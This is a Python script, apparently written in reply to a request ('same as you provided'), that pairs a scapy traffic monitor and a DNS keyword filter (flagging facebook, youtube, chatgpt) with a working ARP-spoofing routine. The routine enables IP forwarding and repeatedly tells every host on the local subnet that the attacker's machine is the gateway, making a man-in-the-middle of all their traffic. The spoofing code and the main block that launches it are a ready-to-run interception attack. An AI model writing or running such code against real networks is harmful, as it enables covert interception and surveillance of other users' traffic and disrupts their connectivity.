from scapy.all import (
    sniff, IP, TCP, UDP, ICMP, ARP, DNS, DNSQR, send,
    get_if_hwaddr, get_if_addr, conf
)
from collections import defaultdict, deque
import threading
import time
import os
import signal
import sys
import subprocess

KEYWORDS = ["facebook", "youtube", "chatgpt"]

#--- NetworkMonitor class unchanged, same as you provided ---#
class NetworkMonitor:
    def __init__(self, interface):
        self.interface = interface
        self.traffic_data = defaultdict(lambda: {
            "packets": 0,
            "bytes": 0,
            "timestamps": deque(maxlen=100),
            "is_malicious": False,
            "malicious_reason": ""
        })
        self.traffic_log = deque(maxlen=1000)
        self.lock = threading.Lock()
        self.high_packet_count_threshold = 100
        self.high_packet_size_threshold = 1000
        self.dos_packet_rate_threshold = 50

    def analyze_packet(self, packet):
        if packet.haslayer(DNS) and packet[DNS].qr == 0 and packet.haslayer(DNSQR):
            self.analyze_dns_packet(packet)

        if not (ARP in packet or IP in packet):
            return

        pkt_len = len(packet)
        timestamp = time.time()
        is_malicious = False
        malicious_reason = ""

        if ARP in packet:
            proto = "ARP"
            src = packet[ARP].psrc
            dst = packet[ARP].pdst
            port = "-"
            ttl = "-"
        else:
            src = packet[IP].src
            dst = packet[IP].dst
            ip_proto = packet[IP].proto
            ttl = getattr(packet[IP], 'ttl', '-')
            port = "-"

            if ip_proto == 1 and ICMP in packet:
                proto = "ICMP"
                icmp_type = packet[ICMP].type
                icmp_code = packet[ICMP].code
                port = f"{icmp_type}.{icmp_code}"
            elif TCP in packet:
                dport = packet[TCP].dport
                proto_map = {
                    443: "HTTPS", 80: "HTTP", 22: "SSH", 53: "DNS",
                    21: "FTP", 25: "SMTP", 110: "POP3", 143: "IMAP",
                    3389: "RDP", 8080: "HTTP-ALT", 3306: "MYSQL", 6379: "REDIS",
                    27017: "MONGODB",
                }
                proto = proto_map.get(dport, "TCP")
                port = str(dport)
            elif UDP in packet:
                dport = packet[UDP].dport
                udp_port_map = {
                    53: "DNS", 123: "NTP", 67: "DHCP", 68: "DHCP",
                    69: "TFTP", 161: "SNMP"
                }
                proto = udp_port_map.get(dport, "UDP")
                port = str(dport)
            else:
                proto_names = {
                    2: "IGMP", 6: "TCP", 17: "UDP", 41: "IPv6",
                    47: "GRE", 50: "ESP", 51: "AH"
                }
                proto = proto_names.get(ip_proto, f"IP-Proto-{ip_proto}")
                port = "-"

        key = (src, dst, proto, port)

        with self.lock:
            data = self.traffic_data[key]
            data["packets"] += 1
            data["bytes"] += pkt_len
            data["timestamps"].append(timestamp)

            recent_packets = [t for t in data["timestamps"] if t > timestamp - 10]
            duration = timestamp - min(data["timestamps"], default=timestamp)
            bps = (data["bytes"] * 8) / max(1, duration)

            if len(recent_packets) > self.dos_packet_rate_threshold and bps > 1000000 and duration > 10:
                is_malicious = True
                malicious_reason = f"Potential DDoS - High rate ({len(recent_packets)} pkt/10s), {bps:.2f} bps, duration {duration:.2f}s"
            elif pkt_len > self.high_packet_size_threshold:
                is_malicious = True
                malicious_reason = f"Large packet size"

            data["is_malicious"] = is_malicious
            data["malicious_reason"] = malicious_reason

            self.traffic_log.append({
                "timestamp": timestamp,
                "source_ip": src,
                "dest_ip": dst,
                "protocol": proto,
                "port": port,
                "packets": 1,
                "bytes": pkt_len,
                "ttl": ttl,
                "status": "High" if is_malicious else "Normal",
                "action": "Logged",
                "is_malicious": is_malicious,
                "malicious_reason": malicious_reason,
            })

    def analyze_dns_packet(self, packet):
        try:
            src_ip = packet[IP].src if packet.haslayer(IP) else "Unknown"
            domain = packet[DNSQR].qname.decode(errors='ignore').lower()
            pkt_len = len(packet)
            timestamp = time.time()

            is_keyword_present = any(keyword in domain for keyword in KEYWORDS)
            malicious_reason = ""
            is_malicious = False

            if is_keyword_present:
                is_malicious = True
                matched_keyword = next(k for k in KEYWORDS if k in domain)
                malicious_reason = f"Accessing restricted site '{matched_keyword}'"
                print(f"[!] MALICIOUS DNS Query: {src_ip} queried '{domain}' containing keyword '{matched_keyword}'")

            key = (src_ip, domain, "DNS", "53")

            with self.lock:
                data = self.traffic_data[key]
                data["packets"] += 1
                data["bytes"] += pkt_len
                data["timestamps"].append(timestamp)
                data["is_malicious"] = is_malicious
                data["malicious_reason"] = malicious_reason if is_malicious else ""

                self.traffic_log.append({
                    "timestamp": timestamp,
                    "source_ip": src_ip,
                    "dest_ip": domain,
                    "protocol": "DNS",
                    "port": "53",
                    "packets": 1,
                    "bytes": pkt_len,
                    "ttl": "-",
                    "status": "High" if is_malicious else "Normal",
                    "action": "Flagged" if is_malicious else "Logged",
                    "is_malicious": is_malicious,
                    "malicious_reason": malicious_reason,
                })
        except Exception as e:
            print(f"[!] Error in analyze_dns_packet: {e}")

    def cleanup_old_entries(self, max_age=30):
        current_time = time.time()
        with self.lock:
            keys_to_delete = [
                key for key, data in self.traffic_data.items()
                if data["timestamps"] and (current_time - data["timestamps"][-1] > max_age)
            ]
            for key in keys_to_delete:
                del self.traffic_data[key]

    def start_sniffing(self):
        print(f"Starting packet capture on {self.interface}... (Ctrl+C to stop)")
        sniff(
            prn=self.analyze_packet,
            store=0,
            filter="ip or arp or udp port 53",
            iface=self.interface,
        )

    def start(self):
        thread = threading.Thread(target=self.start_sniffing, daemon=True)
        thread.start()

    def get_stats(self):
        with self.lock:
            stats = []
            for (src, dst, proto, port), data in self.traffic_data.items():
                is_malicious = data.get("is_malicious", False)
                malicious_reason = data.get("malicious_reason", "")
                stats.append({
                    "source_ip": src,
                    "dest_ip": dst,
                    "protocol": proto,
                    "port": port,
                    "packets": data["packets"],
                    "bytes": data["bytes"],
                    "ttl": "-",
                    "status": "High" if is_malicious else "Normal",
                    "action": "Logged",
                    "is_malicious": is_malicious,
                    "malicious_reason": malicious_reason,
                })
        return sorted(stats, key=lambda x: x["packets"], reverse=True)

    def filter_by_protocol(self, protocol: str):
        protocol = protocol.upper()
        with self.lock:
            filtered = [
                {
                    "source_ip": src,
                    "dest_ip": dst,
                    "protocol": proto,
                    "port": port,
                    "packets": data["packets"],
                    "bytes": data["bytes"],
                }
                for (src, dst, proto, port), data in self.traffic_data.items()
                if protocol == proto.upper()
            ]
        return sorted(filtered, key=lambda x: x["packets"], reverse=True)

# --- Monitor mode helper functions ---

def run_cmd(cmd):
    """Run shell command and return (success, output)."""
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        return True, output.strip()
    except subprocess.CalledProcessError as e:
        return False, e.output.strip()

def set_monitor_mode(interface):
    print(f"[+] Setting {interface} to monitor mode...")
    run_cmd(f"sudo ip link set {interface} down")
    run_cmd(f"sudo iw dev {interface} set monitor control")
    run_cmd(f"sudo ip link set {interface} up")

def set_managed_mode(interface):
    print(f"[+] Restoring {interface} to managed mode...")
    run_cmd(f"sudo ip link set {interface} down")
    run_cmd(f"sudo iw dev {interface} set type managed")
    run_cmd(f"sudo ip link set {interface} up")

def enable_monitor_mode_with_cleanup(interface):
    set_monitor_mode(interface)

    def cleanup(signum, frame):
        print("\n[!] Signal received, restoring interface...")
        set_managed_mode(interface)
        print("[✓] Interface restored. Exiting.")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

# --- Other helper functions ---

def enable_ip_forwarding():
    if os.name == "posix":
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1\n")
            print("[✓] IP forwarding enabled.")
        except Exception as e:
            print(f"[!] Failed to enable IP forwarding: {e}")

def arp_spoof_all_devices(interface, interval=5):
    local_ip = get_if_addr(interface)
    local_mac = get_if_hwaddr(interface)
    gateway_ip = conf.route.route("0.0.0.0")[2]

    base_ip = '.'.join(local_ip.split('.')[:-1])
    print(f"[ARP Spoofing] Claiming to be gateway {gateway_ip} from {local_mac} on {interface}")

    while True:
        for i in range(1, 255):
            target_ip = f"{base_ip}.{i}"
            if target_ip in [local_ip, gateway_ip]:
                continue
            arp_response = ARP(op=2, psrc=gateway_ip, pdst=target_ip,
                               hwdst="ff:ff:ff:ff:ff:ff", hwsrc=local_mac)
            send(arp_response, verbose=False)
        time.sleep(interval)

def get_active_wifi_interface():
    interfaces = [i for i in conf.ifaces.data.keys() if i.startswith('w')]
    if interfaces:
        return interfaces[0]
    else:
        return None

# --- Main ---

if __name__ == "__main__":
    interface = get_active_wifi_interface()
    if not interface:
        print("[!] No wireless interface found. Please check your network interfaces.")
        exit(1)

    print(f"[+] Using interface: {interface}")

    enable_monitor_mode_with_cleanup(interface)

    nm = NetworkMonitor(interface)
    nm.start()

    enable_ip_forwarding()

    spoof_thread = threading.Thread(target=arp_spoof_all_devices, args=(interface,), daemon=True)
    spoof_thread.start()

    print("Network monitor and ARP spoofing started...")

    try:
        while True:
            time.sleep(10)
            nm.cleanup_old_entries(max_age=30)
            stats = nm.get_stats()
            print("\nTop traffic stats:")
            for stat in stats[:10]:
                mal_flag = "!!MALICIOUS!!" if stat.get("is_malicious") else ""
                reason = stat.get("malicious_reason", "")
                print(f"{stat['source_ip']} -> {stat['dest_ip']} | {stat['protocol']}:{stat['port']} "
                      f"Packets: {stat['packets']} Bytes: {stat['bytes']} {mal_flag} {reason}")
    except KeyboardInterrupt:
        # cleanup done via signal handler
        pass
